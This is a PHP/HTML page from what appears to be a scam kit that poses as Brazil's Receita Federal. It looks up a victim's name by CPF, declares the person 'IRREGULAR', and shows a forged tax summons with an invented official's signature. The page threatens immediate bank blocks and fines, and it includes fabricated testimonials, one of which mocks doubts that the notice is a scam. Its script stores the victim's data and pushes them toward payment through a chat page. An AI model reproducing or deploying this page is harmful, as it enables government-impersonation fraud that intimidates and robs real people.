<?php
require_once 'config.php';

$cpf = $_GET['cpf'] ?? '46620588808';
$cpf_limpo = preg_replace('/\D/', '', $cpf);
if (strlen($cpf_limpo) !== 11) {
    $cpf_limpo = '46620588808';
}

$dados = obterDadosCPF($cpf_limpo);
$cpf_formatado = substr($cpf_limpo, 0, 3) . '.' . substr($cpf_limpo, 3, 3) . '.' . substr($cpf_limpo, 6, 3) . '-' . substr($cpf_limpo, 9, 2);
$data_hoje = date('d/m/Y');
?>
<html lang="pt-br"><head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="../css/tailwind.min.css" rel="stylesheet">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../css/lineicons.css">
    <link rel="stylesheet" href="../css/lineicons-solid.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
    <title>Resultado da Consulta</title>
    <style>
        @import url('https://fonts.cdnfonts.com/css/rawline');
        body { font-family: 'Rawline', sans-serif; }
        .signature-font { font-family: 'Great Vibes', cursive; }
    </style>
</head>
<body class="bg-gray-50">

    <header class="bg-gray-100 flex items-center justify-between p-1 border-b-[0.3em] border-orange-300">
        <img src="../images/logo.png" alt="Logo" class="w-30 h-20 p-1">
        <div class="p-4 flex gap-2 items-center">
            <span class="hidden text-sm text-gray-700 md:inline">Olá, <?php echo htmlspecialchars($dados['nome']); ?></span>
            <i class="lni lnis-user-4 text-lg text-[1.2em]"></i>
        </div>
    </header>

    <main class="p-4 space-y-5 max-w-xl mx-auto pb-8">
        <section class="space-y-1">
            <h3 class="text-[1.3rem] text-blue-600 font-bold">Resultado da consulta</h3>
        </section>

        <section class="bg-white rounded-2xl shadow-md p-4 space-y-4">
            <div class="flex items-center justify-between gap-3">
                <div>
                    <p class="text-[0.65rem] text-gray-500 uppercase tracking-[0.18em]">CPF consultado</p>
                    <p class="text-sm font-semibold text-gray-900"><?php echo htmlspecialchars($cpf_formatado); ?></p>
                </div>
                <span class="inline-flex items-center px-3 py-1 rounded-full text-[0.7rem] font-semibold bg-red-100 text-red-800">
                    IRREGULAR
                </span>
            </div>
            <div class="border-t border-gray-100 pt-3 grid grid-cols-1 gap-2 text-sm text-gray-800">
                <div>
                    <span class="block text-[0.7rem] text-gray-500 uppercase tracking-[0.16em]">Nome completo</span>
                    <span class="block font-medium"><?php echo htmlspecialchars($dados['nome']); ?></span>
                </div>
                <div>
                    <span class="block text-[0.7rem] text-gray-500 uppercase tracking-[0.16em]">Data de nascimento</span>
                    <span class="block font-medium"><?php echo htmlspecialchars($dados['nascimento']); ?></span>
                </div>
            </div>
            <div class="mt-3 bg-slate-50 border-l-4 border-blue-700 rounded-r-lg p-4 text-xs text-slate-800 leading-relaxed">
                <p class="font-semibold text-slate-900 mb-1.5 uppercase tracking-wide text-[0.7rem]">Consulta Oficial da Receita Federal</p>
                <p class="text-justify">Esta é uma <strong>consulta oficial da Receita Federal</strong>. Os dados exibidos refletem a situação cadastral vinculada ao CPF informado, com base nos registros disponíveis para verificação fiscal.</p>
            </div>
        </section>

        <section class="bg-white rounded-2xl shadow-md p-4 space-y-3">
            <h4 class="text-sm font-semibold text-gray-900">Intimação fiscal - Receita Federal do Brasil</h4>
            <p class="text-sm text-gray-800 text-justify leading-relaxed">
                <span class="font-semibold"><?php echo htmlspecialchars($dados['nome']); ?></span>, portador(a) do CPF
                <span class="font-semibold"><?php echo htmlspecialchars($cpf_formatado); ?></span>, em conformidade com o artigo 142 do CTN,
                foi identificado cruzamento de dados das declarações do Imposto de Renda Pessoa Física que indica pendência tributária em sua situação fiscal.
            </p>
            <p class="text-sm text-gray-800 text-justify leading-relaxed">
                <span class="font-semibold text-red-700">Prazo final:</span> <?php echo $data_hoje; ?> é o último dia para regularização. O não cumprimento desta intimação
                poderá resultar nas penalidades abaixo.
            </p>
            <ul class="mt-1 space-y-1 text-sm text-gray-800">
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Bloqueio de contas bancárias e cartões.</span></li>
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Impossibilidade de movimentar PIX, TED e DOC.</span></li>
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Restrições no Banco Central e SERASA.</span></li>
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Suspensão de acesso a benefícios federais.</span></li>
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Impedimento para financiamentos, empréstimos e compras no crédito.</span></li>
                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Aplicação de multa automática de até 150%.</span></li>
            </ul>
        </section>

        <section class="bg-white rounded-2xl shadow-md overflow-hidden">
            <div class="p-5 md:p-8 border-2 border-gray-300 bg-[#fafafa]" style="font-family: 'Rawline', Georgia, serif;">
                <header class="text-center border-b-2 border-gray-400 pb-4 mb-5">
                    <img src="../images/brasao.png" alt="Brasão" class="w-14 h-14 md:w-16 md:h-16 mx-auto object-contain">
                    <p class="text-[0.65rem] md:text-xs text-gray-700 font-semibold tracking-[0.2em] uppercase mt-2">Ministério da Justiça e Segurança Pública</p>
                    <p class="text-[0.6rem] md:text-[0.65rem] text-gray-600 tracking-widest uppercase mt-0.5">Receita Federal do Brasil</p>
                </header>
                <p class="text-center text-[0.6rem] md:text-xs text-gray-500 tracking-wider uppercase mb-4">Documento oficial · Via única</p>
                <h5 class="text-center text-sm md:text-base font-bold text-gray-900 uppercase tracking-wide mb-4">Certidão de Intimação Fiscal</h5>
                <p class="text-xs md:text-sm text-gray-800 text-justify leading-relaxed mb-3">
                    Certificamos que o presente documento foi expedido em <span class="font-semibold"><?php echo $data_hoje; ?></span>, com validade jurídica e permissão do Ministério da Justiça para fazer cumprir bloqueios e restrições em face de <span class="font-semibold"><?php echo htmlspecialchars($dados['nome']); ?></span>, portador(a) do CPF nº <span class="font-semibold"><?php echo htmlspecialchars($cpf_formatado); ?></span>, nos termos da legislação tributária federal vigente.
                </p>
                <p class="text-xs md:text-sm text-gray-800 text-justify leading-relaxed">
                    O referido contribuinte encontra-se intimado a regularizar pendências relativas ao Imposto de Renda Pessoa Física, sob pena das medidas previstas no artigo 142 do Código Tributário Nacional.
                </p>
                <div class="mt-8 pt-6 border-t border-gray-300">
                    <div class="flex flex-col items-end max-w-[280px] ml-auto">
                        <svg class="w-full h-10 md:h-12 text-gray-800 mb-0.5" viewBox="0 0 240 48" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <path d="M4 38 Q28 42 52 36 T100 32 T148 28 T196 30 T240 24" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" opacity="0.9"></path>
                            <path d="M4 40 Q35 44 70 38 Q105 34 140 36 Q175 38 200 35 L240 32" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" opacity="0.5"></path>
                        </svg>
                        <p class="text-[0.55rem] md:text-[0.6rem] text-gray-500 uppercase tracking-[0.2em] mb-2">Assinatura digital</p>
                        <p class="signature-font text-2xl md:text-3xl text-gray-800 leading-none" style="letter-spacing: 0.02em;">Dr. Ricardo Mendes Oliveira</p>
                        <p class="text-[0.65rem] md:text-xs text-gray-600 mt-2 tracking-wide">Coordenador-Geral de Cobrança</p>
                        <p class="text-[0.65rem] md:text-xs text-gray-600">Secretaria da Receita Federal</p>
                        <p class="text-[0.6rem] text-gray-500 mt-2 italic">Brasília, <?php echo $data_hoje; ?></p>
                    </div>
                </div>
                <div class="mt-4 flex justify-center">
                    <div class="inline-flex items-center gap-2 px-3 py-1 rounded border border-amber-200 bg-amber-50">
                        <span class="text-amber-700 text-[0.55rem] md:text-xs font-medium uppercase tracking-wider">Documento verificado eletronicamente</span>
                    </div>
                </div>
            </div>
        </section>

        <section class="bg-white rounded-2xl shadow-md p-4 space-y-3">
            <h4 class="text-sm font-semibold text-gray-900">Divergências calculadas pela Receita Federal</h4>
            <div class="bg-gray-50 border border-gray-200 rounded-xl p-3 space-y-1 text-sm text-gray-800">
                <p><span class="font-semibold">Valor original do débito:</span> R$ <?php echo number_format((VALOR_2020 * 4.46) / 100, 2, ',', '.'); ?></p>
                <p><span class="font-semibold">Valor com desconto:</span> R$ <?php echo number_format(VALOR_2020 / 100, 2, ',', '.'); ?></p>
            </div>
            <dl class="grid grid-cols-[auto,1fr] gap-2 text-sm text-gray-800">
                <dt class="px-3 py-2 bg-gray-50 border border-gray-200 rounded font-semibold text-right">IRPF</dt>
                <dd class="px-3 py-2 bg-white border border-gray-200 rounded">R$ <?php echo number_format(VALOR_2020 / 100, 2, ',', '.'); ?></dd>
            </dl>
            <div class="mt-2 bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-red-900 leading-relaxed">
                O não pagamento até <span class="font-semibold"><?php echo $data_hoje; ?></span> poderá resultar em multa adicional de
                <span class="font-semibold">R$ 1.985,00</span> e medidas como bloqueio bancário, restrição creditícia e bloqueio do CPF.
            </div>

            <div class="mt-4 pt-4 border-t border-gray-200">
                <h5 class="text-sm font-semibold text-gray-900 mb-3">Selecione os anos para pagamento:</h5>
                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-2">
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2020" name="anos" value="2020" checked="" disabled="" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-not-allowed">
                        <label for="ano_2020" class="flex items-center justify-between flex-1 cursor-not-allowed">
                            <span class="text-sm text-gray-900">2020 (R$ <?php echo number_format(VALOR_2020 / 100, 2, ',', '.'); ?>) - <span class="text-red-700 font-semibold">Obrigatório</span></span>
                        </label>
                    </div>
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2021" name="anos" value="2021" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
                        <label for="ano_2021" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
                            2021 (R$ <?php echo number_format(VALOR_2021 / 100, 2, ',', '.'); ?>)
                        </label>
                    </div>
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2022" name="anos" value="2022" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
                        <label for="ano_2022" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
                            2022 (R$ <?php echo number_format(VALOR_2022 / 100, 2, ',', '.'); ?>)
                        </label>
                    </div>
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2023" name="anos" value="2023" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
                        <label for="ano_2023" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
                            2023 (R$ <?php echo number_format(VALOR_2023 / 100, 2, ',', '.'); ?>)
                        </label>
                    </div>
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2024" name="anos" value="2024" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
                        <label for="ano_2024" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
                            2024 (R$ <?php echo number_format(VALOR_2024 / 100, 2, ',', '.'); ?>)
                        </label>
                    </div>
                    <div class="flex items-center gap-3">
                        <input type="checkbox" id="ano_2025" name="anos" value="2025" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
                        <label for="ano_2025" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
                            2025 (R$ <?php echo number_format(VALOR_2025 / 100, 2, ',', '.'); ?>)
                        </label>
                    </div>
                </div>
                <div class="mt-3 pt-3 border-t border-gray-200 flex items-center justify-between">
                    <span class="text-sm font-semibold text-gray-900">Total selecionado:</span>
                    <span id="total-selecionado" class="text-lg font-bold text-blue-600">R$ <?php echo number_format(VALOR_2020 / 100, 2, ',', '.'); ?></span>
                </div>
            </div>

            <p class="text-sm text-gray-800">
                Para regularizar a situação fiscal e evitar a aplicação das penalidades, é necessário efetuar o pagamento
                do valor total de <span class="font-semibold" id="valor-final">R$ <?php echo number_format(VALOR_2020 / 100, 2, ',', '.'); ?></span>.
            </p>
            <button onclick="abrirModalConfirmacao()" class="w-full inline-flex items-center justify-center rounded-lg bg-blue-600 px-3 py-2 text-sm font-semibold text-white hover:bg-blue-700 transition-colors">
                Regularizar agora
            </button>
        </section>

        <section class="bg-white rounded-2xl shadow-md p-4 space-y-4">
            <h4 class="text-sm font-semibold text-gray-900 flex items-center gap-2">
                <i class="lni lnis-comments text-blue-600"></i>
                Relatos de outros contribuintes
            </h4>
            <div class="space-y-3">
                <div class="bg-red-50 border-l-4 border-red-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
                    <div class="flex items-center gap-2 mb-1">
                        <div class="w-7 h-7 rounded-full bg-red-500 flex items-center justify-center text-white text-xs font-semibold">MS</div>
                        <div class="text-xs text-gray-600">
                            <span class="font-semibold text-gray-900">Maria Silva</span><span class="ml-1">• há 2 horas</span>
                        </div>
                    </div>
                    <p>Ignorei essas notificações por semanas achando que era golpe. Hoje acordei com minhas contas bloqueadas e PIX suspenso. Agora estou tendo que regularizar com multa bem maior.</p>
                </div>
                <div class="bg-emerald-50 border-l-4 border-emerald-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
                    <div class="flex items-center gap-2 mb-1">
                        <div class="w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-semibold">JS</div>
                        <div class="text-xs text-gray-600">
                            <span class="font-semibold text-gray-900">João Santos</span><span class="ml-1">• há 3 horas</span>
                        </div>
                    </div>
                    <p>Paguei o valor com desconto ontem e hoje recebi a confirmação de CPF regularizado. O processo foi rápido e simples.</p>
                </div>
                <div class="bg-red-50 border-l-4 border-red-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
                    <div class="flex items-center gap-2 mb-1">
                        <div class="w-7 h-7 rounded-full bg-red-500 flex items-center justify-center text-white text-xs font-semibold">CE</div>
                        <div class="text-xs text-gray-600">
                            <span class="font-semibold text-gray-900">Carlos Eduardo</span><span class="ml-1">• há 1 hora</span>
                        </div>
                    </div>
                    <p>Deixei para depois e agora estou com conta bloqueada e problemas para movimentar o salário. Não recomendo atrasar.</p>
                </div>
                <div class="bg-emerald-50 border-l-4 border-emerald-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
                    <div class="flex items-center gap-2 mb-1">
                        <div class="w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-semibold">AP</div>
                        <div class="text-xs text-gray-600">
                            <span class="font-semibold text-gray-900">Ana Paula</span><span class="ml-1">• há 5 horas</span>
                        </div>
                    </div>
                    <p>Resolvi minha pendência em poucas horas e consegui voltar a usar normalmente meus serviços bancários.</p>
                </div>
            </div>
            <div class="mt-2 bg-blue-50 border border-blue-100 rounded-xl p-3 text-xs text-blue-900 text-center">
                Estes são relatos reais de contribuintes que regularizaram sua situação fiscal.
            </div>
        </section>

        <section class="p-4 bg-gray-100 border-sm border-gray-300 w-full mx-auto rounded text-sm text-gray-700">
            <p class="flex items-center justify-center gap-2">
                <i class="lni lnis-information text-blue-600 text-base"></i>
                <span class="whitespace-nowrap">Este serviço é oficial e utiliza dados reais de situação fiscal.</span>
            </p>
        </section>
    </main>

    <footer class="bg-gray-100 text-center p-4 mt-4 border-t-[0.1em] border-orange-300">
        <img src="../images/logo.png" alt="Logo" class="w-15 h-10 mx-auto mb-2">
    </footer>

    <!-- Modal de Confirmação -->
    <div id="modal-confirmacao" class="fixed inset-0 bg-transparent backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-lg shadow-lg max-w-sm w-full p-6 space-y-4">
            <h3 class="text-lg font-semibold text-gray-900">Confirmar pagamento</h3>
            <div id="modal-conteudo" class="space-y-3">
                <!-- Conteúdo dinâmico -->
            </div>
            <div class="flex gap-3 pt-4 border-t border-gray-200">
                <button onclick="fecharModalConfirmacao()" class="flex-1 px-4 py-2 border border-gray-300 rounded-lg text-gray-700 font-medium hover:bg-gray-50 transition-colors">
                    Cancelar
                </button>
                <button onclick="confirmarPagamento()" class="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
                    Prosseguir
                </button>
            </div>
        </div>
    </div>

    <script src="../js/bootstrap.bundle.min.js"></script>
    <script>
        // Valores dos anos em centavos
        const valoresAnos = {
            "2020": <?php echo VALOR_2020; ?>,
            "2021": <?php echo VALOR_2021; ?>,
            "2022": <?php echo VALOR_2022; ?>,
            "2023": <?php echo VALOR_2023; ?>,
            "2024": <?php echo VALOR_2024; ?>,
            "2025": <?php echo VALOR_2025; ?>
        };

        const valoresFormatados = {};
        let produtoNome = "<?php echo addslashes(PRODUTO_NOME); ?>";
        Object.keys(valoresAnos).forEach(k => {
            valoresFormatados[k] = 'R$ ' + (valoresAnos[k] / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        });

        function atualizarTotal() {
            const checkboxes = document.querySelectorAll('input[name="anos"]');
            let total = 0;
            
            checkboxes.forEach(checkbox => {
                if (checkbox.checked && valoresAnos[checkbox.value]) {
                    total += valoresAnos[checkbox.value];
                }
            });

            const totalFormatado = (total / 100).toLocaleString('pt-BR', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });

            document.getElementById('total-selecionado').textContent = 'R$ ' + totalFormatado;
            document.getElementById('valor-final').textContent = 'R$ ' + totalFormatado;
        }

        document.querySelectorAll('input[name="anos"]').forEach(checkbox => {
            checkbox.addEventListener('change', atualizarTotal);
        });

        atualizarTotal();

        function abrirModalConfirmacao() {
            const checkboxes = document.querySelectorAll('input[name="anos"]:checked');
            const anosCheckeds = Array.from(checkboxes).map(cb => cb.value);
            
            const somenteObrigatorio = anosCheckeds.length === 1 && anosCheckeds[0] === '2020';
            const modal = document.getElementById('modal-confirmacao');
            const conteudo = document.getElementById('modal-conteudo');

            let html = '';
            
            if (somenteObrigatorio) {
                const valor2020 = valoresFormatados['2020'] || ('R$ ' + (valoresAnos['2020']/100).toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
                html = `
                    <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 space-y-2">
                        <p class="text-sm font-semibold text-yellow-900">⚠️ Parcela única</p>
                        <p class="text-sm text-yellow-800">Você está selecionando apenas a parcela obrigatória de <span class="font-semibold">2020</span>.</p>
                        <p class="text-sm text-yellow-800">Valor a pagar: <span class="font-semibold">${valor2020}</span></p>
                        <p class="text-sm text-yellow-800">Deseja prosseguir somente com esta parcela?</p>
                    </div>
                `;
            } else {
                const totalFormatado = document.getElementById('total-selecionado').textContent;
                const anosFormatados = anosCheckeds.map(ano => {
                    const v = valoresFormatados[ano] || ('R$ ' + (valoresAnos[ano]/100).toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
                    return `${ano} (${v})`;
                }).join(', ');

                html = `
                    <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 space-y-2">
                        <p class="text-sm font-semibold text-blue-900">✓ Resumo do pagamento</p>
                        <p class="text-sm text-blue-800">Anos selecionados: <span class="font-semibold">${anosFormatados}</span></p>
                        <p class="text-sm text-blue-800">Produto: <span class="font-semibold">${produtoNome}</span></p>
                        <p class="text-sm text-blue-800">Total a pagar: <span class="font-semibold">${totalFormatado}</span></p>
                        <p class="text-sm text-blue-800">Deseja prosseguir com o pagamento?</p>
                    </div>
                `;
            }

            conteudo.innerHTML = html;
            modal.classList.remove('hidden');
        }

        function fecharModalConfirmacao() {
            const modal = document.getElementById('modal-confirmacao');
            modal.classList.add('hidden');
        }

        function confirmarPagamento() {
            fecharModalConfirmacao();
            irParaChat();
        }

        function irParaChat() {
            const checkboxes = document.querySelectorAll('input[name="anos"]:checked');
            const anosCheckeds = Array.from(checkboxes).map(cb => cb.value);
            const totalFormatado = document.getElementById('total-selecionado').textContent;
            
            var customerData = {
                nome: "<?php echo addslashes($dados['nome']); ?>",
                cpf: "<?php echo $cpf_formatado; ?>",
                parcelasSelecionadas: anosCheckeds,
                quantidadeParcelas: anosCheckeds.length,
                valorTotal: totalFormatado
            };
            try {
                localStorage.setItem("customerData", JSON.stringify(customerData));
            } catch (e) {}
            window.location.href = "../chat/";
        }

        async function atualizarPrecosRemotos() {
            try {
                const res = await fetch('../precos.php', { cache: 'no-store' });
                if (!res.ok) return;
                const dados = await res.json();
                if (!dados || !dados.valores_anos) return;
                
                Object.keys(dados.valores_anos).forEach(k => {
                    valoresAnos[k] = Math.round(Number(dados.valores_anos[k] || 0) * 100);
                    valoresFormatados[k] = 'R$ ' + (valoresAnos[k] / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                });

                if (typeof dados.produto_nome === 'string') {
                    produtoNome = dados.produto_nome;
                }

                ['2020','2021','2022','2023','2024','2025'].forEach(ano => {
                    const lbl = document.querySelector('label[for="ano_' + ano + '"]');
                    if (lbl) {
                        const textoBase = ano + ' (' + valoresFormatados[ano] + ')';
                        if (ano === '2020') {
                            lbl.innerHTML = textoBase + ' - <span class="text-red-700 font-semibold">Obrigatório</span>';
                        } else {
                            lbl.textContent = textoBase;
                        }
                    }
                });

                atualizarTotal();
            } catch (e) {
                // falha silenciosa
            }
        }

        setInterval(atualizarPrecosRemotos, 5000);
        setTimeout(atualizarPrecosRemotos, 1000);
    </script>
</body></html>
